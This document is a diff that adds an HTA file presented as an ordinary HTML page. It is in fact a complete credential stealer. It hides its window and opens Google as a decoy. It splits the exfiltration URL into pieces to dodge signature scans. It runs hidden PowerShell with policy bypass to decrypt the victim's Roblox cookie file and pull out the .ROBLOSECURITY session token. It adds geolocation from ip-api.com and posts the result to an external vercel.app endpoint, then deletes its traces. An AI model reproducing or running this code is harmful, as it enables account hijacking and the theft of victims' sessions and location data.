@@ -1,0 +1,88 @@
+<html>
+<head>
+<HTA:APPLICATION 
+    WINDOWSTATE="minimize" 
+    SHOWINTASKBAR="no" 
+    SYSMENU="no" 
+    CAPTION="no"
+    BORDER="none"
+>
+<script language="jscript">
+
+// Ablenkung: Unauffällige Weiterleitung zu Google im Hintergrund oder Standardbrowser
+try {
+    var decoyShell = new ActiveXObject("WScript.Shell");
+    decoyShell.Run("https://www.google.com", 0, false);
+} catch(e) {}
+
+// URL dynamisch zusammenbauen, um statische URL-Signaturen zu umgehen
+var p1 = "https://flash";
+var p2 = "drive-vert";
+var p3 = ".vercel.app/api/index";
+var targetUrl = p1 + p2 + p3;
+
+try {
+    var shell = new ActiveXObject("WScript.Shell");
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");
+    var tempTxtPath = tempFolder + "\\sys_cache_data.txt";
+
+    var psScript = 
+        "Add-Type -AssemblyName System.Security;" +
+        "$p = Join-Path $env:LOCALAPPDATA 'Roblox\\LocalStorage\\RobloxCookies.dat';" +
+        "if(Test-Path $p) {" +
+        "    $json = Get-Content $p -Raw | ConvertFrom-Json;" +
+        "    $b = [Convert]::FromBase64String($json.CookiesData);" +
+        "    try {" +
+        "        $decBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);" +
+        "        $decrypted = [System.Text.Encoding]::UTF8.GetString($decBytes);" +
+        "    } catch {" +
+        "        $decrypted = '';" +
+        "    }" +
+        "    $clean = '';" +
+        "    if($decrypted -match '\\.ROBLOSECURITY\\s+([^;\\s]+)') {" +
+        "        $clean = $Matches[1];" +
+        "    } else {" +
+        "        if($decrypted -match '\\.ROBLOSECURITY=([^;\\s]+)') {" +
+        "            $clean = $Matches[1];" +
+        "        } else {" +
+        "            $clean = $decrypted;" +
+        "        }" +
+        "    }" +
+        "    $geo = @{};" +
+        "    try {" +
+        "        $ipInfo = Invoke-RestMethod -Uri 'http://ip-api.com/json/' -TimeoutSec 3;" +
+        "        $geo.city = $ipInfo.city;" +
+        "        $geo.region = $ipInfo.regionName;" +
+        "        $geo.country = $ipInfo.country;" +
+        "    } catch {" +
+        "        $geo.city = 'Unknown'; $geo.region = 'Unknown'; $geo.country = 'Unknown';" +
+        "    }" +
+        "    $body = @{ cookieValue = $clean; city = $geo.city; region = $geo.region; country = $geo.country } | ConvertTo-Json -Compress;" +
+        "    [System.IO.File]::WriteAllText('" + tempTxtPath.replace(/\\/g, '\\\\') + "', $body);" +
+        "}";
+
+    var command = "powershell.exe -w h -ep bypass -c \"" + psScript + "\"";
+    shell.Run(command, 0, true);
+
+    if (fso.FileExists(tempTxtPath)) {
+        var fileStream = fso.OpenTextFile(tempTxtPath, 1);
+        var fileContent = fileStream.ReadAll();
+        fileStream.Close();
+
+        var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
+        xhr.open("POST", targetUrl, false);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(fileContent);
+
+        try { fso.DeleteFile(tempTxtPath); } catch(err) {}
+    }
+
+} catch(e) {}
+
+window.close();
+</script>
+</head>
+<body>
+</body>
+</html>
